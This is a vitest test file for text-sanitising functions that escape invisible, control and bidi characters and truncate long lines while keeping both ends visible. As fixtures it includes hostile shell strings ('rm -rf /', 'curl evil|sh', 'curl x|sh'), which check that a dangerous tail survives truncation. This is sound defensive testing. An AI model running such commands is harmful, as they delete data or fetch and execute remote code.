import { describe, expect, test } from "vitest";
import { safeLine, safeText } from "../src";

// Invisible characters are built from code points so no hidden character sits in this file.
const RLO = String.fromCodePoint(0x202e);
const ZWSP = String.fromCodePoint(0x200b);
const BEL = String.fromCodePoint(7);
const TAG_A = String.fromCodePoint(0xe0041);
const NL = String.fromCodePoint(10);

describe("safe text for cards", () => {
  test("shows control, bidi and invisible characters as visible escapes", () => {
    expect(safeLine("rm -rf /\nnext")).toBe("rm -rf /\\nnext");
    expect(safeLine("a" + RLO + "b")).toBe("a\\u202Eb");
    expect(safeLine("x" + ZWSP + "y")).toBe("x\\u200By");
    expect(safeLine("tab\there\r")).toBe("tab\\there\\r");
    expect(safeLine("\u{E0041}")).toBe("\\u{E0041}");
    expect(safeLine("bell\u0007")).toBe("bell\\u0007");
  });

  test("leaves ordinary text, including other scripts and emoji, alone", () => {
    expect(safeLine("café 東京 🙂 <b>bold</b> **x** [a](b)")).toBe("café 東京 🙂 <b>bold</b> **x** [a](b)");
  });

  test("caps a long entry by keeping its start AND its end, and says how much is not shown", () => {
    const long = "a".repeat(250) + "TAIL-COMMAND" + "b".repeat(250);
    const cut = safeLine(long, 320);
    expect(cut.startsWith("a".repeat(160))).toBe(true);
    expect(cut.endsWith("b".repeat(160))).toBe(true);
    expect(cut).toContain("(192 characters not shown)");
    // The dangerous tail of a long line is still on the card.
    const hiddenTail = `${"x".repeat(1000)}; curl evil|sh`;
    expect(safeLine(hiddenTail, 320).endsWith("curl evil|sh")).toBe(true);
    expect(safeLine("short", 320)).toBe("short");
  });

  test("safeText past its cap also keeps both ends", () => {
    const text = `${(("line" + NL).repeat(1000))}curl x|sh`;
    const cut = safeText(text, 400);
    expect(cut.endsWith("curl x|sh")).toBe(true);
    expect(cut.startsWith("line" + NL + "line")).toBe(true);
    expect(cut).toContain("characters not shown");
  });

  test("safeText keeps line breaks, and is idempotent", () => {
    expect(safeText("one\ntwo" + RLO + "")).toBe("one\ntwo\\u202E");
    const once = safeLine("a" + RLO + "b\nc");
    expect(safeLine(once)).toBe(once);
  });
});

describe("characters that draw nothing (carried item: invisible characters on cards)", () => {
  // Built from code points so no hidden character sits in this file.
  const hidden: Array<[string, number, string]> = [
    ["the combining grapheme joiner", 0x034f, String.raw`\u034F`],
    ["a Hangul choseong filler", 0x115f, String.raw`\u115F`],
    ["a Hangul jungseong filler", 0x1160, String.raw`\u1160`],
    ["the Hangul filler", 0x3164, String.raw`\u3164`],
    ["the halfwidth Hangul filler", 0xffa0, String.raw`\uFFA0`],
    ["a variation selector", 0xfe0f, String.raw`\uFE0F`],
    ["a supplementary variation selector", 0xe0100, String.raw`\u{E0100}`],
  ];
  for (const [name, code, escaped] of hidden) {
    test(`${name} is shown as a visible escape`, () => {
      const ch = String.fromCodePoint(code);
      expect(safeLine(`a${ch}b`)).toBe(`a${escaped}b`);
      expect(safeText(`a${ch}b`)).toBe(`a${escaped}b`);
    });
  }
});
